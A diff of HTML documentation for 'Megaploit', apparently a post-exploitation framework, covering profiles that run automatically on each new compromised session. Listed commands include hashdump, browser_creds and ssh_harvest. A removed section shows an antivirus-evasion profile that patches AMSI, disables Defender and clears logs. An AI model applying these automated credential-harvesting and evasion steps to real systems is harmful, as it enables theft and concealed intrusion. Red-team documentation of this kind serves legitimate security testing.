@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#post-exploitation-pipeline-reference" class="md-skip">
+        <a href="#post-exploitation-pipeline-autorunscript" class="md-skip">
           Skip to content
         </a>
       
@@ -692,76 +692,293 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#cli-commands" class="md-nav__link">
+  <a href="#post-exploitation-pipeline" class="md-nav__link">
     <span class="md-ellipsis">
       
-        CLI Commands
+        Post-Exploitation Pipeline
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Post-Exploitation Pipeline">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enable-a-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enable a profile
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#built-in-profiles" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#see-whats-active" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Built-in Profiles
+        See what's active
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#execution-flow" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#disable-a-profile" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Execution Flow
+        Disable a profile
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#python-api" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#available-profiles" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Python API
+        Available profiles
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#extending-with-custom-profiles" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#example-full-automated-recon-cred-harvest" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Extending with Custom Profiles
+        Example: Full automated recon + cred harvest
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#relationship-with-autorunscript" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#reload-pipeline-config" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Relationship with AutoRunScript
+        Reload pipeline config
       
     </span>
   </a>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
-  <a href="#thread-safety" class="md-nav__link">
+  <a href="#autorunscript" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Thread Safety
+        AutoRunScript
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AutoRunScript">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#config-file-location" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Config file location
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-the-default-template" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create the default template
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#view-current-config" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        View current config
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reload-from-disk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reload from disk
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#preview-what-would-run-for-a-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Preview what would run for a session
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#config-file-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Config File Reference
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Config File Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-sections" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key sections
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execution-order" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execution order
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-tags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Tags
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Session Tags">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#set-a-tag-on-a-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Set a tag on a session
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tag-based-autorunscript-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tag-based AutoRunScript example
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#practical-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Practical Scenarios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Practical Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-internal-network-assessment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 1 — Internal Network Assessment
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-quick-credential-sweep" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 2 — Quick Credential Sweep
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-silent-long-term-monitoring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 3 — Silent Long-Term Monitoring
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-happens-when-a-session-connects" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Happens When a Session Connects
       
     </span>
   </a>
@@ -931,54 +1148,61 @@
   
 
 
-<h1 id="post-exploitation-pipeline-reference">Post-Exploitation Pipeline Reference<a class="headerlink" href="#post-exploitation-pipeline-reference" title="Permanent link">&para;</a></h1>
-<blockquote>
-<p><strong>NEW in v3.0</strong> — <code>megaploit/core/pipeline.py</code></p>
-</blockquote>
+<h1 id="post-exploitation-pipeline-autorunscript">Post-Exploitation Pipeline &amp; AutoRunScript<a class="headerlink" href="#post-exploitation-pipeline-autorunscript" title="Permanent link">&para;</a></h1>
+<p>Two complementary systems that automate actions on every new session.</p>
+<hr />
 <h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
-<p>The <strong>Post-Exploitation Pipeline</strong> extends AutoRunScript with named <strong>collection profiles</strong>. When a new session opens, the pipeline runs the AutoRunScript baseline <strong>plus</strong> all active profiles, in one unified, deduplicated command list dispatched in a daemon thread.</p>
-<p>This means operators can type <code>pipeline enable creds</code> once and have credential collection run automatically on every future session — without editing any config files.</p>
+<table>
+<thead>
+<tr>
+<th>System</th>
+<th>What it does</th>
+<th>How to configure</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Pipeline</strong></td>
+<td>Runs a named collection profile on every new session</td>
+<td><code>pipeline enable &lt;profile&gt;</code></td>
+</tr>
+<tr>
+<td><strong>AutoRunScript</strong></td>
+<td>Runs per-OS and per-tag command lists</td>
+<td>Edit <code>~/.megaploit_autorun.json</code></td>
+</tr>
+</tbody>
+</table>
+<p>Both run automatically in a background thread when a new agent connects — the operator isn't blocked.</p>
 <hr />
-<h2 id="cli-commands">CLI Commands<a class="headerlink" href="#cli-commands" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>pipeline status           Show active profiles + available profiles
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>pipeline list             List all profiles with ● active / ○ inactive indicators
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>pipeline enable &lt;name&gt;    Enable a profile (takes effect on next session)
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>pipeline disable &lt;name&gt;   Disable a profile
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>pipeline reload           Reload ~/.megaploit_autorun.json into the pipeline
+<h2 id="post-exploitation-pipeline">Post-Exploitation Pipeline<a class="headerlink" href="#post-exploitation-pipeline" title="Permanent link">&para;</a></h2>
+<p>The pipeline runs <strong>named profiles</strong> on every new session. Profiles are collections of session commands that gather common data automatically.</p>
+<h3 id="enable-a-profile">Enable a profile<a class="headerlink" href="#enable-a-profile" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>megaploit [0] » pipeline enable creds
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>[+] Profile &#39;creds&#39; enabled — will run on every new session
 </span></code></pre></div>
-<p><strong>Example workflow:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>megaploit [0] » pipeline list
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  ○ basic
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>  ○ creds
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>  ○ full
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>  ○ network
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>  ○ recon
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>megaploit [0] » pipeline enable creds
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>[+] Pipeline profile creds enabled — active on next session.
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>megaploit [0] » pipeline enable recon
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>[+] Pipeline profile recon enabled — active on next session.
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>megaploit [0] » pipeline status
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>  ╭─── Post-Exploitation Pipeline ───────────────╮
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>  │ Active profiles   creds, recon               │
-</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>  │ Available         basic  creds  full  …      │
-</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>  ╰───────────────────────────────────────────────╯
-</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
-</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a># When session opens → runs: sysinfo (autorun) + all creds cmds + all recon cmds
-</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>
-</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>megaploit [0] » pipeline disable recon
-</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>[+] Pipeline profile recon disabled.
+<h3 id="see-whats-active">See what's active<a class="headerlink" href="#see-whats-active" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>megaploit [0] » pipeline status
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  Active profiles:  creds, recon
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>  Available:        basic, creds, recon, network, full
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>megaploit [0] » pipeline list
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>  Profile   Status    Commands
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>  basic     inactive  sysinfo, whoami, pwd, env
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>  creds     ACTIVE    hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>  recon     ACTIVE    ps, installed_software, scheduled_tasks, users, os_info
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>  network   inactive  arp, netstat, ifconfig
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>  full      inactive  (all of the above)
 </span></code></pre></div>
-<hr />
-<h2 id="built-in-profiles">Built-in Profiles<a class="headerlink" href="#built-in-profiles" title="Permanent link">&para;</a></h2>
+<h3 id="disable-a-profile">Disable a profile<a class="headerlink" href="#disable-a-profile" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>megaploit [0] » pipeline disable creds
+</span></code></pre></div>
+<h3 id="available-profiles">Available profiles<a class="headerlink" href="#available-profiles" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
 <th>Profile</th>
-<th>Commands</th>
+<th>Commands run automatically</th>
 </tr>
 </thead>
 <tbody>
@@ -996,86 +1220,192 @@
 </tr>
 <tr>
 <td><code>network</code></td>
-<td><code>arp</code>, <code>netstat</code>, <code>ifconfig</code>, <code>hosts_file</code></td>
+<td><code>arp</code>, <code>netstat</code>, <code>ifconfig</code></td>
 </tr>
 <tr>
 <td><code>full</code></td>
-<td>Union of <code>basic + creds + recon + network</code></td>
+<td>All of the above combined</td>
 </tr>
 </tbody>
 </table>
-<hr />
-<h2 id="execution-flow">Execution Flow<a class="headerlink" href="#execution-flow" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Console._on_new_session(session)
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    │
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    ├── _pipeline.commands_for(session)
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    │   ├── _autorun.commands_for(session)   ← global + platform + tag rules
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    │   └── for each active profile:
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    │           add profile commands not already in the list
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    │   → deduplicated, ordered list
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    │
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>    └── threading.Thread(daemon=True):
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>            time.sleep(0.5)                  ← wait for session to stabilise
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>            for cmd in cmds:
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>                dispatch(session, cmd)       ← send via protocol
+<h3 id="example-full-automated-recon-cred-harvest">Example: Full automated recon + cred harvest<a class="headerlink" href="#example-full-automated-recon-cred-harvest" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>megaploit [0] » pipeline enable full
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>[+] Profile &#39;full&#39; enabled
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a># Now every new agent connection automatically runs:
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a># sysinfo, whoami, pwd, env,
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a># hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault,
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a># ps, installed_software, scheduled_tasks, users, os_info,
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a># arp, netstat, ifconfig
 </span></code></pre></div>
-<p>The 0.5 s delay prevents commands racing before the agent's main loop is ready.</p>
-<hr />
-<h2 id="python-api">Python API<a class="headerlink" href="#python-api" title="Permanent link">&para;</a></h2>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">megaploit.core.pipeline</span><span class="w"> </span><span class="kn">import</span> <span class="n">Pipeline</span><span class="p">,</span> <span class="n">pipeline</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># Use the global singleton:</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">pipeline</span><span class="o">.</span><span class="n">enable_profile</span><span class="p">(</span><span class="s2">&quot;creds&quot;</span><span class="p">)</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">pipeline</span><span class="o">.</span><span class="n">disable_profile</span><span class="p">(</span><span class="s2">&quot;recon&quot;</span><span class="p">)</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># Check status:</span>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="n">pipeline</span><span class="o">.</span><span class="n">active_profiles</span><span class="p">()</span>        <span class="c1"># [&quot;creds&quot;]</span>
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="n">pipeline</span><span class="o">.</span><span class="n">available_profiles</span><span class="p">()</span>     <span class="c1"># [&quot;basic&quot;, &quot;creds&quot;, &quot;full&quot;, &quot;network&quot;, &quot;recon&quot;]</span>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="n">pipeline</span><span class="o">.</span><span class="n">is_enabled</span><span class="p">(</span><span class="s2">&quot;creds&quot;</span><span class="p">)</span>      <span class="c1"># True</span>
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="c1"># Get commands for a session:</span>
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="kn">from</span><span class="w"> </span><span class="nn">unittest.mock</span><span class="w"> </span><span class="kn">import</span> <span class="n">MagicMock</span>
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="n">sess</span> <span class="o">=</span> <span class="n">MagicMock</span><span class="p">()</span>
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="n">sess</span><span class="o">.</span><span class="n">os_name</span> <span class="o">=</span> <span class="s2">&quot;linux&quot;</span>
-</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="n">sess</span><span class="o">.</span><span class="n">tag</span> <span class="o">=</span> <span class="s2">&quot;dc&quot;</span>
-</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="n">cmds</span> <span class="o">=</span> <span class="n">pipeline</span><span class="o">.</span><span class="n">commands_for</span><span class="p">(</span><span class="n">sess</span><span class="p">)</span>
-</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
-</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="c1"># Reload autorun config from disk:</span>
-</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="n">pipeline</span><span class="o">.</span><span class="n">reload_autorun</span><span class="p">()</span>
-</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
-</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="c1"># Summary dict:</span>
-</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="n">info</span> <span class="o">=</span> <span class="n">pipeline</span><span class="o">.</span><span class="n">summary</span><span class="p">()</span>
-</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a><span class="c1"># {</span>
-</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="c1">#   &quot;active_profiles&quot;: [&quot;creds&quot;],</span>
-</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="c1">#   &quot;available_profiles&quot;: [&quot;basic&quot;, &quot;creds&quot;, &quot;full&quot;, &quot;network&quot;, &quot;recon&quot;],</span>
-</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="c1">#   &quot;autorun&quot;: {&quot;path&quot;: &quot;~/.megaploit_autorun.json&quot;, &quot;global&quot;: [...], ...}</span>
-</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="c1"># }</span>
-</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>
-</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="c1"># Create an isolated instance (e.g. for testing):</span>
-</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="n">p</span> <span class="o">=</span> <span class="n">Pipeline</span><span class="p">()</span>
-</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="n">p</span><span class="o">.</span><span class="n">enable_profile</span><span class="p">(</span><span class="s2">&quot;basic&quot;</span><span class="p">)</span>
+<p>All results are saved to the credential store and loot directory automatically.</p>
+<h3 id="reload-pipeline-config">Reload pipeline config<a class="headerlink" href="#reload-pipeline-config" title="Permanent link">&para;</a></h3>
+<p>If you edit the AutoRunScript config file while Megaploit is running:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>megaploit [0] » pipeline reload
 </span></code></pre></div>
 <hr />
-<h2 id="extending-with-custom-profiles">Extending with Custom Profiles<a class="headerlink" href="#extending-with-custom-profiles" title="Permanent link">&para;</a></h2>
-<p>Profiles are defined in the <code>_PROFILES</code> dict in <code>megaploit/core/pipeline.py</code>. Add a new entry:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># megaploit/core/pipeline.py  (after the built-in profiles)</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">_PROFILES</span><span class="p">[</span><span class="s2">&quot;av_evasion&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    <span class="s2">&quot;patch_amsi&quot;</span><span class="p">,</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    <span class="s2">&quot;disable_defender&quot;</span><span class="p">,</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    <span class="s2">&quot;clear_logs&quot;</span><span class="p">,</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="p">]</span>
+<h2 id="autorunscript">AutoRunScript<a class="headerlink" href="#autorunscript" title="Permanent link">&para;</a></h2>
+<p>AutoRunScript gives you finer control — run different commands based on the <strong>OS</strong> and <strong>session tag</strong>.</p>
+<h3 id="config-file-location">Config file location<a class="headerlink" href="#config-file-location" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>~/.megaploit_autorun.json
 </span></code></pre></div>
-<p>The new profile appears immediately in <code>pipeline list</code> and <code>pipeline enable av_evasion</code> after a reload.</p>
-<hr />
-<h2 id="relationship-with-autorunscript">Relationship with AutoRunScript<a class="headerlink" href="#relationship-with-autorunscript" title="Permanent link">&para;</a></h2>
-<p>The pipeline <strong>wraps</strong> AutoRunScript — it does not replace it. The baseline from <code>~/.megaploit_autorun.json</code> always runs first; profile commands are appended in sorted profile order, deduplicated.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Final command list = deduplicate(autorun_commands + profile_commands)
+<h3 id="create-the-default-template">Create the default template<a class="headerlink" href="#create-the-default-template" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>megaploit [0] » autorun save-default
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>[+] Template written to ~/.megaploit_autorun.json
 </span></code></pre></div>
-<p>If <code>sysinfo</code> appears in both the autorun global list and the <code>basic</code> profile, it only runs once (first occurrence wins).</p>
+<h3 id="view-current-config">View current config<a class="headerlink" href="#view-current-config" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>megaploit [0] » autorun show
+</span></code></pre></div>
+<h3 id="reload-from-disk">Reload from disk<a class="headerlink" href="#reload-from-disk" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>megaploit [0] » autorun reload
+</span></code></pre></div>
